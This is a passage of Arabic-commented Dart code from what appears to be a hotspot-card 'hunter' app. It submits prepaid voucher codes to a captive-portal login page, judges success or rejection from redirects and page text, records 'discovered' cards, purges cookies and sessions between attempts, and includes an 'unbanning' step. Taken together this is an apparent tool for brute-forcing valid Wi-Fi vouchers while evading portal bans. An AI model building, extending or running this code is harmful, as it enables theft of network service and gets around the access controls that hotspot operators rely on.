      if (_isPortalHostUrl(finalUrl, loginUrl) &&
          _isSuccessBody(combinedFinal)) {
        return LoginVerificationResult.success(finalUrl);
      }

      if (_isRejectionBody(combinedFinal) ||
          (_isLoginUrl(finalUrl, loginUrl) &&
              domFinal.isReady &&
              domFinal.hasUsernameInput)) {
        return LoginVerificationResult.definitiveFailure(finalUrl);
      }

      // انتهاء المهلة دون رد قطعي يعتبر غير محسوم (R2: يُحظر تخطي الكرت أو اعتباره فاشلاً على التأخر)
      return const LoginVerificationResult.inconclusive(
        error: 'انتهت مهلة انتظار نتيجة الفحص دون رد قطعي من البوابة',
      );
    } else {
      // التحقق الموضوعي من استجابة HTTP المستلمة في الخطوة السابقة دون إرسال طلب مكرر
      final response = _lastHttpResponse;
      if (response == null) {
        return const LoginVerificationResult.inconclusive(
          error: 'لم يتم استلام استجابة HTTP',
        );
      }

      final statusCode = response.statusCode;
      final location = response.headerLocation ?? '';
      final body = response.data.toString().toLowerCase();

      // إعادة التوجيه (301/302/303):
      // إذا وجه لصفحة status -> نجاح
      // إذا أعاد التوجيه لصفحة login -> الكرت غير صحيح (رفض صريح)
      if (statusCode == 302 || statusCode == 303 || statusCode == 301) {
        if (location.isNotEmpty) {
          final resolvedLocation = Uri.parse(loginUrl)
              .resolve(location)
              .toString();
          if (_isStatusUrl(resolvedLocation, loginUrl)) {
            return LoginVerificationResult.success(resolvedLocation);
          }
          if (_isLoginUrl(resolvedLocation, loginUrl)) {
            return LoginVerificationResult.definitiveFailure(resolvedLocation);
          }
        }
      }

      // استجابة 200
      if (statusCode == 200) {
        if (_isSuccessBody(body)) {
          return LoginVerificationResult.success(
            location.isNotEmpty ? location : '$loginUrl/status',
          );
        }
        if (_isRejectionBody(body) ||
            body.contains(config.usernameField.toLowerCase())) {
          return LoginVerificationResult.definitiveFailure(loginUrl);
        }
        return const LoginVerificationResult.inconclusive(
          error: 'استجابة HTTP 200 غير محسومة (لا تحتوي على تأكيد نجاح أو رفض)',
        );
      }

      // أي رمز حالة آخر (408، 429، 500، 502، إلخ) هو خطأ اتصال/بوابة وليس فشل كرت
      return LoginVerificationResult.inconclusive(
        error: 'رمز استجابة الراوتر غير محسوم: $statusCode',
      );
    }
  }

  /// تنفيذ دورة تسجيل الخروج الصارمة وتطهير الجلسة بالكامل مع تكرار المحاولة حتى التأكيد (R3)
  Future<bool> _executeProperLogoutAndPurge({
    required SettingsModel config,
    required String logoutUrl,
    required String loginUrl,
  }) async {
    final eraseLogoutUrl = logoutUrl.contains('?')
        ? '$logoutUrl&erase-cookie=1'
        : '$logoutUrl?erase-cookie=1';
    final cooldownMs =
        (config.postNavWait > 0 ? config.postNavWait * 1000 : 1500).toInt();

    while (!_stopRequested) {
      try {
        if (config.useWebView && browserController != null) {
          await browserController!.executeLogout();
          await delayer.delay(const Duration(milliseconds: 600));
          await browserController!.loadUrl(eraseLogoutUrl);
          await delayer.delay(const Duration(milliseconds: 600));
          await _cleanBrowserData();
          await delayer.delay(Duration(milliseconds: cooldownMs));
          await browserController!.loadUrl(loginUrl);
          await delayer.delay(const Duration(seconds: 1));

          if (_stopRequested) return false;
          if (!await connectivityChecker.isConnected(loginUrl)) {
            onLog?.call(
              '  ⚠️ تعذر تأكيد صفحة الدخول بعد تسجيل الخروج: الاتصال غير متاح — إعادة المحاولة...',
            );
            await delayer.delay(const Duration(seconds: 2));
            continue;
          }

          final currentUrl = await browserController!.currentUrl();
          final dom = await browserController!.inspectLoginPage(
            expectedField: config.usernameField,
          );
          final loginPageConfirmed =
              _isLoginUrl(currentUrl, loginUrl) &&
              _isLoginUrl(dom.url, loginUrl) &&
              dom.isReady &&
              !dom.isOfflinePage &&
              !dom.isStatusPage &&
              dom.hasUsernameInput &&
              dom.hasSubmitButton;
          if (!loginPageConfirmed) {
            onLog?.call(
              '  ⚠️ لم تؤكد البوابة صفحة دخول نظيفة بعد تسجيل الخروج '
              '(url=$currentUrl, reason=${dom.reason ?? 'unconfirmed'}) — إعادة محاولة الخروج...',
            );
            await delayer.delay(const Duration(seconds: 1));
            continue;
          }
          return true;
        }

        await httpClient.get(logoutUrl);
        await httpClient.get(eraseLogoutUrl);
        await delayer.delay(Duration(milliseconds: cooldownMs));
        if (_stopRequested) return false;
        if (!await connectivityChecker.isConnected(loginUrl)) {
          onLog?.call(
            '  ⚠️ تعذر تأكيد صفحة الدخول بعد تسجيل الخروج: الاتصال غير متاح — إعادة المحاولة...',
          );
          await delayer.delay(const Duration(seconds: 2));
          continue;
        }

        final response = await httpClient.get(loginUrl);
        final body = response.data.toString().toLowerCase();
        final loginPageConfirmed =
            response.statusCode == 200 &&
            !_isStatusBody(body) &&
            body.contains('<input') &&
            body.contains('name=');
        if (!loginPageConfirmed) {
          onLog?.call(
            '  ⚠️ لم تؤكد استجابة البوابة صفحة دخول نظيفة بعد تسجيل الخروج '
            '(HTTP ${response.statusCode}) — إعادة محاولة الخروج...',
          );
          await delayer.delay(const Duration(seconds: 1));
          continue;
        }
        return true;
      } catch (error) {
        onLog?.call('  ⚠️ تعذر التحقق من تسجيل الخروج: $error — إعادة المحاولة...');
        await delayer.delay(const Duration(seconds: 2));
      }
    }
    return false;
  }

  /// تطهير كافة الكوكيز والذاكرة المؤقتة وبيانات التخزين
  Future<void> _cleanBrowserData() async {
    if (browserController != null) {
      await browserController!.clearCookies();
      await browserController!.clearLocalStorage();
      await browserController!.clearCache();
    }
  }

  /// فحص مرن لرابط تسجيل الدخول
  bool _isLoginUrl(String url, [String? portalUrl]) {
    if (url.isEmpty) return false;
    try {
      final uri = Uri.parse(url);
      if (portalUrl != null && !_isPortalHostUrl(url, portalUrl)) return false;
      final path = uri.path.toLowerCase();
      return path.isEmpty || path == '/' || path.contains('login');
    } catch (_) {
      return false;
    }
  }

  /// فحص مرن لرابط صفحة الحالة status
  bool _isStatusUrl(String url, [String? portalUrl]) {
    if (url.isEmpty) return false;
    try {
      final uri = Uri.parse(url);
      if (portalUrl != null && !_isPortalHostUrl(url, portalUrl)) return false;
      return uri.pathSegments.any(
        (segment) => segment.toLowerCase() == 'status',
      );
    } on FormatException {
      return false;
    }
  }

  bool _isPortalHostUrl(String url, String portalUrl) {
    try {
      final uri = Uri.parse(url);
      final safePortal = portalUrl.contains('://')
          ? portalUrl
          : 'http://$portalUrl';
      final portalUri = Uri.parse(safePortal);
      return uri.host.isNotEmpty &&
          portalUri.host.isNotEmpty &&
          uri.host.toLowerCase() == portalUri.host.toLowerCase();
    } on FormatException {
      return false;
    }
  }

  /// فحص نص الصفحة للتأكد من احتوائها على مؤشرات نجاح الجلسة
  bool _isSuccessBody(String body) {
    final lower = body.toLowerCase();
    return lower.contains('logged in') ||
        lower.contains('session active') ||
        lower.contains('الوقت المتبقي') ||
        lower.contains('التحميل المتبقي') ||
        lower.contains('اضغط هنا لتسجيل الخروج');
  }

  /// فحص نص الصفحة لمؤشرات جلسة status نشطة
  bool _isStatusBody(String body) {
    final lower = body.toLowerCase();
    return lower.contains('logged in') ||
        lower.contains('session active') ||
        lower.contains('الوقت المتبقي') ||
        lower.contains('اضغط هنا لتسجيل الخروج');
  }

  /// فحص نص الصفحة للتأكد من مؤشرات الرفض الصريح للكرت
  bool _isRejectionBody(String body) {
    final lower = body.toLowerCase();
    return lower.contains('invalid') ||
        lower.contains('error') ||
        lower.contains('failed') ||
        lower.contains('failure') ||
        lower.contains('rejected') ||
        lower.contains('user not found') ||
        lower.contains('unknown user') ||
        lower.contains('wrong password') ||
        lower.contains('expired') ||
        lower.contains('خطأ') ||
        lower.contains('غير صحيح') ||
        lower.contains('غير صحيحة') ||
        lower.contains('اسم المستخدم غير صحيح') ||
        lower.contains('كلمة المرور غير صحيحة') ||
        lower.contains('كرت غير صالح') ||
        lower.contains('الكرت غير صالح') ||
        lower.contains('كرت غير موجود') ||
        lower.contains('الكرت غير موجود') ||
        lower.contains('انتهت صلاحية') ||
        lower.contains('انتهى رصيد') ||
        lower.contains('الرصيد منتهي') ||
        lower.contains('فشل تسجيل الدخول') ||
        lower.contains('فشل');
  }

  /// اسم وصفي للخطوة الحالية في آلة الحالة
  String _stepName(HunterStep step) {
    switch (step) {
      case HunterStep.idle:
        return 'جاهز';
      case HunterStep.checkingConnectivity:
        return 'فحص الاتصال الفعلي بالشبكة';
      case HunterStep.preparingLoginPage:
        return 'التحقق من صفحة الدخول والـ DOM';
      case HunterStep.submittingLogin:
        return 'إرسال بيانات الكرت';
      case HunterStep.verifyingResult:
        return 'التحقق من نتيجة الدخول';
      case HunterStep.handlingSuccess:
        return 'تسجيل الكرت المكتشف';
      case HunterStep.loggingOutAndPurging:
        return 'تسجيل الخروج ومسح الجلسة';
      case HunterStep.unbanning:
        return 'فك الحظر';
    }
  }
}
